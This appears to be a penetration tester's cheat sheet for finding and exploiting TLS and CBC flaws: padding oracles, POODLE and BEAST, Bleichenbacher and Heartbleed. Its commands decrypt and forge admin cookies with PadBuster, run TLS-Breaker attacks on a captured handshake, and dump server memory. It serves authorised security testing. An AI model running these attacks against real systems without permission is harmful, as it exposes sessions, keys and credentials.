
> [!IMPORTANT]
> 
> **REMINDER:** Always use **Java 11** for all TLS-Breaker tools to ensure compatibility.
> use testssl to check if the server is vuln to any of them first by using `bash testssl.sh https://example.com`



## 1. Padding Oracles

### I. Identifying the Entry Point

- **Target Encoded Strings:** Look for **Base64** or **Hex** encoded strings in Cookies, Hidden Form Fields, or URL Parameters (e.g., `user=QUJDREVGR0hJSktMTU5PUA==`).
    
- **Analyze the Content:** Decode the string; if it results in unreadable "garbage" binary data, it is likely encrypted and worth testing.
    

### II. Testing for the "Oracle"

- **Trigger an Error:** Modify the last bytes of the encrypted string.
    
- **Compare Responses:** Observe how the server reacts to the corrupted padding.
    

### III. What to Look For (The Indicators)

- **Verbose Error Messages:** Explicit responses like `"Invalid Padding"`, `"PKCS#7 error"`, or `"Decryption failed"`.
    
- **HTTP Status Codes:** A `500 Internal Server Error` for bad padding versus a `200 OK` or `401 Unauthorized` for valid padding.
    
- **Different Response Length:** Significant byte differences in the response body.
    
- **Timing Differences:** Variations in how long the server takes to process valid vs. invalid padding.
    

### IV. Practical Exploitation

- **Determine Block Size:** Test with common sizes like **16 bytes** (AES) or **8 bytes** (DES/3DES).
    
- **Automate with Tools:** * **PadBuster:** Use for automated decryption of existing strings or for forging new ones (e.g., changing `user=guest` to `user=admin`).
    
    - **Burp Suite:** Use the "Padding Oracle Hunter" extension or the "Intruder" tool to manually compare response differences.
        

#### A. Decrypting Data

Run this to see what is hidden inside the encrypted string. _Note: If it was a POST param, use the `-post` flag instead of `-cookies`._

Bash

```
padbuster [URL] "[EncryptedSample]" [BlockSize] -cookies "user=[EncryptedSample]"
```

#### B. Forging Data

Create the specific plaintext you want to inject:

Bash

```
padbuster [URL] "[Sample]" 16 -cookies "user=[Sample]" -plaintext "user=admin"
```

---

## 2. POODLE & BEAST

### I. How to Find the Vulnerabilities

- **Check Protocol Support:** Use tools like `nmap` or `sslyze` to see if the server supports **SSL 3.0** (for POODLE) or **TLS 1.0** (for BEAST).
    
    - _Example:_ `nmap --script ssl-enum-ciphers -p 443 <IP>`
        
- **Identify CBC Ciphers:** These attacks only work if the server uses **Cipher Block Chaining (CBC)** mode (e.g., `TLS_RSA_WITH_AES_128_CBC_SHA`).
    
- **Look for Protocol Downgrades:** Test if you can force a modern browser to "fallback" to SSL 3.0 by interfering with the initial handshake.
    

### II. Practical Identification Checklist

|**Attack**|**Primary Target**|**Key Indicator**|
|---|---|---|
|**POODLE**|SSL 3.0|Server accepts connections using SSL 3.0 with CBC ciphers.|
|**BEAST**|TLS 1.0|Server supports TLS 1.0 and uses CBC-based suites.|

### III. Exploitation Steps (Using TLS-Breaker)

If the server supports the vulnerable protocols, use **TLS-Breaker** to verify.

1. **Setup:** Ensure you have **Java 11** installed and build the tool using Maven.
    
2. **Scanning for POODLE:**
    
    Bash
    
    ```
    java -jar apps/poodle-1.0.1.jar -connect <IP>:<PORT>
    ```
    
3. **Interpreting Results:**
    
    - `VULNERABILITY_POSSIBLE`: The server accepted the crafted handshake and didn't throw a MAC error where it should have.
        
    - `NOT_VULNERABLE`: The server rejected the connection or correctly handled the padding/MAC check.
        

---

## 3. Bleichenbacher Attack — Full Workflow

### Prerequisites

- **Java 11 specifically** (not newer)
    
- `bleichenbacher-1.0.1.jar`
    
- `tcpdump`, `openssl`
    

### Step 1 — Verify RSA Key Exchange

Bash

```
echo | openssl s_client -connect <IP>:<PORT> 2>/dev/null | openssl x509 -noout -text | grep -E "Public Key Algorithm|RSA|EC"
```

> **Note:** You need to see `rsaEncryption`. If you see `id-ecPublicKey`, the attack will not work.

### Step 2 — Confirm the Oracle

Bash

```
/usr/lib/jvm/java-11-openjdk-amd64/bin/java \
  -jar apps/bleichenbacher-1.0.1.jar \
  -connect <IP>:<PORT>
```

> **Look for:** `"Found a behavior difference within the responses. The server could be vulnerable."`

### Step 3 — Identify Network Interface

Bash

```
ip route get <IP>
```

Identify the interface (e.g., `dev enp8s0` or `dev tun0`) for use in `tcpdump`.

### Step 4 — Capture a Real Handshake

**Terminal 1 (Start capture):**

Bash

```
sudo tcpdump -i <INTERFACE> -w capture.pcap host <IP> and port <PORT>
```

**Terminal 2 (Trigger handshake):**

Bash

```
openssl s_client -connect <IP>:<PORT> -tls1_2 -cipher AES128-SHA
```

_Wait for session info, then `Ctrl+C` Terminal 1._

### Step 5 — Execute the Attack

Bash

```
/usr/lib/jvm/java-11-openjdk-amd64/bin/java \
  -jar apps/bleichenbacher-1.0.1.jar \
  -connect <IP>:<PORT> \
  -pcap capture.pcap \
  -executeAttack
```

### Variable Reference

|**Variable**|**How to Determine It**|
|---|---|
|`<IP>:<PORT>`|Target address given by scope.|
|`<INTERFACE>`|Found via `ip route get <IP>` (the `dev` field).|
|`-cipher AES128-SHA`|Any `TLS_RSA_*` suite works. RSA key exchange is the requirement.|
|`capture.pcap`|Your chosen output filename.|

---

## 4. Heartbleed

### I. Identification

Use `nmap` to determine vulnerability status:

Bash

```
nmap -p <PORT> -Pn --script ssl-heartbleed,ssl-enum-ciphers <IP>
```

### II. Exploitation

Execute the attack using the Java-based tool to dump memory:

Bash

```
/usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar apps/heartbleed-1.0.1.jar -connect <IP>:<PORT> -executeAttack -heartbeats 10
```
